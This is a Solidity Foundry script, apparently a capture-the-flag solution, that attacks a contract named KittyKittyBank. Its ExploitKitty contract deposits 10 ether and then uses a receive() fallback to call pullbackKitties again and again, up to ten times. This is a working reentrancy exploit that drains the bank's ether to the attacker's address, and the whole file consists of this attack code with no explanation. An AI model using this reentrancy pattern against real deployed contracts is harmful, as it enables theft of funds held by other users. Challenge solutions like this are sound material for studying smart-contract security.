// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {KittyKittyBank} from "../src/KittyKittyBank.sol";
import {Script,console} from "forge-std/Script.sol";
import {Setup} from "../src/Setup.sol";

contract Exploit is Script{
    function run()public{
        vm.startBroadcast();
        Setup setup=Setup(/**YOUR_SETUP_ADDRESS */);
        ExploitKitty exploit=new ExploitKitty(address(setup.kittyBank()));
        console.log(exploit.owner());
        exploit.pwn{value: 10 ether}();
        vm.stopBroadcast();
    }
}
contract ExploitKitty{
    KittyKittyBank kittybank;
    uint8 i=0;
    address public owner;
    constructor(address _kittybank) public{
        owner = msg.sender;
        kittybank = KittyKittyBank(_kittybank);
    }

    function pwn()public payable{
        kittybank.sendKitties{value: msg.value}();
        kittybank.pullbackKitties();
    }

    receive() external payable {
        if(i<10){
            i++;
            owner.call{value: msg.value}("");
            kittybank.pullbackKitties();
        }
    }
}